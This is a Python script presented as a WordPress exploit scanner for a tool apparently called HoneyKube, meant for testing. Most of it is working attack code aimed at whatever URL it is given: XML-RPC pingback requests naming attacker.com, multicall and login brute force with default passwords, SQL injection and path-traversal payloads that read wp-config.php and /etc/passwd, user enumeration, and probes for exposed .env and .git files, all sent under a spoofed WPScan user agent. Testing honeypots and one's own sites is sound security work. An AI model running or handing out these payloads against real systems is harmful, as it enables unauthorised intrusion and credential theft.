#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
# ]
# ///
"""
WordPress Exploit Scanner - Common WordPress Vulnerabilities
Tests for real-world WordPress exploitation techniques.

Vulnerabilities tested:
- XML-RPC Pingback DDoS (CVE-2013-0235)
- XML-RPC Brute Force
- User Enumeration (/?author=N)
- wp-config.php.bak exposure
- Debug.log exposure
- Plugin/Theme vulnerabilities
- SQL Injection in plugins
- File Upload vulnerabilities
"""

import argparse
import sys
import json
import re
import base64
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin
from typing import Optional, Dict, List, Any

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║              WordPress Exploit Scanner                       ║
║         XML-RPC, SQLi, User Enum, File Exposure              ║
║                  HoneyKube Testing Tool                      ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def normalize_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    return url.rstrip("/")


class WordPressScanner:
    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False):
        self.target = normalize_url(target)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        self.results = {
            "target": self.target,
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "vulnerabilities": [],
            "users": [],
            "exposed_files": [],
            "errors": []
        }

    def log(self, msg: str, color: str = Colors.WHITE):
        if self.verbose:
            print(colorize(msg, color))

    def add_vuln(self, name: str, severity: str, details: str, payload: str = None):
        vuln = {
            "name": name,
            "severity": severity,
            "details": details,
            "payload": payload
        }
        self.results["vulnerabilities"].append(vuln)
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.BLUE
        print(colorize(f"[{severity}] {name}: {details}", color))

    def request(self, method: str, path: str, **kwargs) -> Optional[requests.Response]:
        url = urljoin(self.target, path)
        try:
            resp = self.session.request(
                method, url, 
                timeout=self.timeout, 
                verify=self.verify_ssl,
                allow_redirects=False,
                **kwargs
            )
            return resp
        except RequestException as e:
            self.log(f"[!] Request failed: {e}", Colors.YELLOW)
            return None

    def test_xmlrpc_methods(self):
        """Test XML-RPC for available methods and vulnerabilities."""
        self.log("[*] Testing XML-RPC endpoint...", Colors.CYAN)
        
        # First check if xmlrpc.php exists
        resp = self.request("GET", "/xmlrpc.php")
        if not resp or resp.status_code == 404:
            self.log("[-] XML-RPC not found", Colors.YELLOW)
            return

        # List methods
        payload = """<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>"""
        
        resp = self.request("POST", "/xmlrpc.php", 
                           data=payload,
                           headers={"Content-Type": "application/xml"})
        
        if resp and "pingback.ping" in resp.text:
            self.add_vuln(
                "XML-RPC Pingback Enabled",
                "MEDIUM",
                "pingback.ping method available - can be used for DDoS amplification",
                payload
            )

        if resp and "wp.getUsersBlogs" in resp.text:
            self.add_vuln(
                "XML-RPC Authentication Methods",
                "MEDIUM", 
                "wp.getUsersBlogs available - can be used for brute force attacks",
                payload
            )

        # Test pingback exploit
        pingback_payload = """<?xml version="1.0"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>http://attacker.com/xxe</string></value></param>
        <param><value><string>{target}/</string></value></param>
    </params>
</methodCall>""".format(target=self.target)

        resp = self.request("POST", "/xmlrpc.php",
                           data=pingback_payload,
                           headers={"Content-Type": "application/xml"})
        
        if resp and resp.status_code == 200:
            self.add_vuln(
                "XML-RPC Pingback DDoS",
                "HIGH",
                "Server accepts pingback requests - CVE-2013-0235",
                pingback_payload
            )

    def test_xmlrpc_bruteforce(self):
        """Test XML-RPC multicall brute force vulnerability."""
        self.log("[*] Testing XML-RPC brute force...", Colors.CYAN)

        # wp.getUsersBlogs multicall amplification attack
        credentials = [
            ("admin", "admin"),
            ("admin", "admin123"),
            ("admin", "password"),
            ("admin", "wordpress"),
            ("administrator", "admin123"),
        ]

        # Build multicall payload
        methods = ""
        for user, pwd in credentials:
            methods += f"""
        <value>
            <struct>
                <member>
                    <name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                    <name>params</name>
                    <value>
                        <array>
                            <data>
                                <value><string>{user}</string></value>
                                <value><string>{pwd}</string></value>
                            </data>
                        </array>
                    </value>
                </member>
            </struct>
        </value>"""

        payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>{methods}
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>"""

        resp = self.request("POST", "/xmlrpc.php",
                           data=payload,
                           headers={"Content-Type": "application/xml"})
        
        if resp and resp.status_code == 200:
            # Check for successful auth
            if "isAdmin" in resp.text or "<int>1</int>" in resp.text:
                self.add_vuln(
                    "XML-RPC Brute Force Success",
                    "HIGH",
                    "Valid credentials found via XML-RPC multicall",
                    payload
                )
            else:
                self.add_vuln(
                    "XML-RPC Multicall Available",
                    "MEDIUM",
                    "System.multicall enabled - amplifies brute force attacks",
                    payload
                )

    def test_user_enumeration(self):
        """Test user enumeration via author parameter."""
        self.log("[*] Testing user enumeration...", Colors.CYAN)

        for author_id in range(1, 6):
            resp = self.request("GET", f"/?author={author_id}")
            
            if resp and resp.status_code in (200, 301, 302):
                # Check for username in redirect or body
                location = resp.headers.get("Location", "")
                if "/author/" in location:
                    username = location.split("/author/")[-1].strip("/")
                    self.results["users"].append({"id": author_id, "username": username})
                    self.log(f"[+] Found user: {username} (ID: {author_id})", Colors.GREEN)
                elif "/author/" in resp.text:
                    match = re.search(r'/author/([^/"\s]+)', resp.text)
                    if match:
                        username = match.group(1)
                        self.results["users"].append({"id": author_id, "username": username})
                        self.log(f"[+] Found user: {username} (ID: {author_id})", Colors.GREEN)

        if self.results["users"]:
            self.add_vuln(
                "User Enumeration",
                "LOW",
                f"Found {len(self.results['users'])} users via /?author=N",
                "GET /?author=1"
            )

        # Also try REST API enumeration
        resp = self.request("GET", "/wp-json/wp/v2/users")
        if resp and resp.status_code == 200:
            try:
                users = resp.json()
                for user in users:
                    self.results["users"].append({
                        "id": user.get("id"),
                        "username": user.get("slug"),
                        "name": user.get("name")
                    })
                self.add_vuln(
                    "REST API User Enumeration",
                    "MEDIUM",
                    f"User list exposed via /wp-json/wp/v2/users",
                    "GET /wp-json/wp/v2/users"
                )
            except:
                pass

    def test_sensitive_files(self):
        """Test for exposed sensitive files."""
        self.log("[*] Testing for sensitive file exposure...", Colors.CYAN)

        sensitive_files = [
            ("/wp-config.php.bak", "WordPress configuration backup"),
            ("/wp-config.php~", "WordPress configuration backup"),
            ("/wp-config.php.old", "WordPress configuration backup"),
            ("/wp-config.php.save", "WordPress configuration backup"),
            ("/wp-config.php.swp", "Vim swap file"),
            ("/.wp-config.php.swp", "Vim swap file"),
            ("/wp-content/debug.log", "Debug log file"),
            ("/debug.log", "Debug log file"),
            ("/error_log", "Error log file"),
            ("/wp-content/uploads/", "Uploads directory listing"),
            ("/.git/config", "Git repository exposed"),
            ("/.svn/entries", "SVN repository exposed"),
            ("/.env", "Environment file"),
            ("/readme.html", "WordPress readme - version disclosure"),
            ("/license.txt", "WordPress license - version disclosure"),
            ("/wp-includes/version.php", "WordPress version file"),
            ("/xmlrpc.php?rsd", "XML-RPC service discovery"),
        ]

        for path, description in sensitive_files:
            resp = self.request("GET", path)
            
            if resp and resp.status_code == 200:
                # Check if it's actually content (not a redirect/error page)
                if len(resp.text) > 50 and "404" not in resp.text.lower():
                    self.results["exposed_files"].append({
                        "path": path,
                        "description": description,
                        "size": len(resp.text)
                    })
                    
                    severity = "HIGH" if "config" in path or ".env" in path or ".git" in path else "MEDIUM"
                    self.add_vuln(
                        f"Sensitive File Exposed: {path}",
                        severity,
                        description,
                        f"GET {path}"
                    )

    def test_sql_injection(self):
        """Test for SQL injection in common vulnerable parameters."""
        self.log("[*] Testing for SQL injection...", Colors.CYAN)

        # Common vulnerable endpoints
        sqli_tests = [
            # Plugin vulnerabilities
            ("/wp-content/plugins/revslider/temp/update_extract/revslider/db.php", 
             "?id=1' AND SLEEP(5)--", "Revolution Slider SQLi"),
            ("/wp-admin/admin-ajax.php", 
             "?action=revslider_show_image&img=../wp-config.php", "RevSlider LFI"),
            
            # Classic injection points
            ("/?p=1", "' OR '1'='1", "Post ID injection"),
            ("/?page_id=1", "' UNION SELECT 1,2,3,4,5--", "Page ID injection"),
            ("/?cat=1", "' AND 1=1--", "Category injection"),
            
            # Search injection
            ("/?s=", "test' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "Search SQLi"),
            
            # Common plugin vulns
            ("/wp-content/plugins/theme-je498ghq4-flavor/flavor.php", 
             "?id=1'+UNION+SELECT+1,2,user(),4,5--", "Theme SQLi"),
        ]

        for base_path, payload, description in sqli_tests:
            if "?" in base_path:
                url_path = base_path + payload
            else:
                url_path = base_path + "?id=" + payload

            resp = self.request("GET", url_path)
            
            if resp and resp.status_code == 200:
                # Check for SQL error messages
                sql_errors = [
                    "mysql_fetch", "mysql_query", "mysqli_",
                    "SQL syntax", "sql error", "ORA-",
                    "PostgreSQL", "sqlite_", "SQLITE_ERROR",
                    "Warning:", "Error:", "database error"
                ]
                
                for error in sql_errors:
                    if error.lower() in resp.text.lower():
                        self.add_vuln(
                            f"SQL Injection: {description}",
                            "HIGH",
                            f"SQL error detected in response",
                            f"GET {url_path}"
                        )
                        break

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities."""
        self.log("[*] Testing for directory traversal...", Colors.CYAN)

        traversal_payloads = [
            ("../../../wp-config.php", "wp-config traversal"),
            ("....//....//....//etc/passwd", "etc/passwd traversal"),
            ("..%252f..%252f..%252fwp-config.php", "Double URL encoded traversal"),
            ("..\\..\\..\\wp-config.php", "Windows traversal"),
        ]

        endpoints = [
            "/wp-content/plugins/flavor/includes/ajax.php?file=",
            "/wp-content/themes/flavor/download.php?file=",
            "/?file=",
            "/?path=",
            "/?template=",
        ]

        for endpoint in endpoints:
            for payload, description in traversal_payloads:
                url = endpoint + payload
                resp = self.request("GET", url)
                
                if resp and resp.status_code == 200:
                    # Check for config file content
                    if "DB_NAME" in resp.text or "DB_PASSWORD" in resp.text:
                        self.add_vuln(
                            f"Path Traversal: {description}",
                            "HIGH",
                            "wp-config.php contents exposed",
                            f"GET {url}"
                        )
                    elif "root:" in resp.text or "/bin/bash" in resp.text:
                        self.add_vuln(
                            f"Path Traversal: {description}",
                            "HIGH",
                            "/etc/passwd contents exposed",
                            f"GET {url}"
                        )

    def test_wp_login_bruteforce(self):
        """Test wp-login.php for brute force vulnerabilities."""
        self.log("[*] Testing wp-login.php...", Colors.CYAN)

        credentials = [
            ("admin", "admin"),
            ("admin", "admin123"),
            ("admin", "password"),
            ("admin", "wordpress"),
            ("admin", "123456"),
        ]

        for username, password in credentials:
            payload = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{self.target}/wp-admin/",
                "testcookie": "1"
            }

            resp = self.request("POST", "/wp-login.php", data=payload)
            
            if resp:
                # Check for successful login
                if resp.status_code == 302 and "wp-admin" in resp.headers.get("Location", ""):
                    self.add_vuln(
                        "Weak Credentials",
                        "HIGH",
                        f"Valid login found: {username}:{password}",
                        f"POST /wp-login.php log={username}&pwd={password}"
                    )
                    return
                # Check for username enumeration via error message
                if "Invalid username" in resp.text:
                    self.log(f"[-] Username '{username}' does not exist", Colors.YELLOW)
                elif "incorrect" in resp.text.lower():
                    self.log(f"[+] Username '{username}' exists (password incorrect)", Colors.GREEN)
                    self.results["users"].append({"username": username, "source": "login_error"})

    def run_all_tests(self):
        """Run all vulnerability tests."""
        print(colorize(f"\n[*] Scanning: {self.target}", Colors.CYAN))
        print(colorize("=" * 60, Colors.CYAN))

        self.test_xmlrpc_methods()
        self.test_xmlrpc_bruteforce()
        self.test_user_enumeration()
        self.test_sensitive_files()
        self.test_sql_injection()
        self.test_directory_traversal()
        self.test_wp_login_bruteforce()

        print(colorize("\n" + "=" * 60, Colors.CYAN))
        print(colorize("[*] Scan Complete!", Colors.GREEN))
        print(colorize(f"[*] Vulnerabilities found: {len(self.results['vulnerabilities'])}", 
                      Colors.RED if self.results['vulnerabilities'] else Colors.GREEN))
        print(colorize(f"[*] Users found: {len(self.results['users'])}", Colors.CYAN))
        print(colorize(f"[*] Exposed files: {len(self.results['exposed_files'])}", Colors.CYAN))

        return self.results


def main():
    parser = argparse.ArgumentParser(
        description="WordPress Exploit Scanner - HoneyKube Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output file for results (JSON)")

    args = parser.parse_args()

    print_banner()

    scanner = WordPressScanner(
        args.url,
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        verbose=args.verbose
    )

    results = scanner.run_all_tests()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {args.output}", Colors.GREEN))


if __name__ == "__main__":
    main()
